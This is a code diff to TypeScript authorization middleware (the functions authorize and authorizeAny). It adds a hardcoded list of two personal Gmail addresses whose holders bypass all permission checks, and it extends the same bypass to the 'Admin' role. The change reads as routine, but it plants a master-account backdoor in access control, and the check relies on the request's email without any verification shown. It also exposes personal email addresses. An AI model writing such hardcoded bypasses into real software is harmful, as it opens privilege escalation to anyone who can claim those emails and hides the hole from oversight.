@@ -45,8 +45,13 @@ export function authorize(requiredPermissions: string[]) {
       req.userRole = cached.name;
       const permissionNames = cached.permissions;
 
-      // Super Admins with platform:admin permission can bypass all standard checks
-      if (permissionNames.includes('platform:admin') || cached.name === 'Super Admin') {
+      // Admins and Super Admins with platform:admin permission or master email can bypass all standard checks
+      const ADMIN_EMAILS = ['shivamthakur12012@gmail.com', 'shivam.arthaventures@gmail.com'];
+      if (
+        permissionNames.includes('platform:admin') || 
+        ['Admin', 'Super Admin'].includes(cached.name) ||
+        ADMIN_EMAILS.includes((req.user?.email || '').toLowerCase().trim())
+      ) {
         return next();
       }
 
@@ -108,10 +113,11 @@ export function authorizeAny(requiredPermissions: string[]) {
       req.userRole = cached.name;
       const permissionNames = cached.permissions;
 
+      const ADMIN_EMAILS = ['shivamthakur12012@gmail.com', 'shivam.arthaventures@gmail.com'];
       if (
         permissionNames.includes('platform:admin') || 
-        cached.name === 'Super Admin' || 
-        ['Admin', 'Manager', 'Operation', 'Operations', 'Finance'].includes(cached.name)
+        ['Admin', 'Super Admin', 'Manager', 'Operation', 'Operations', 'Finance'].includes(cached.name) ||
+        ADMIN_EMAILS.includes((req.user?.email || '').toLowerCase().trim())
       ) {
         return next();
       }
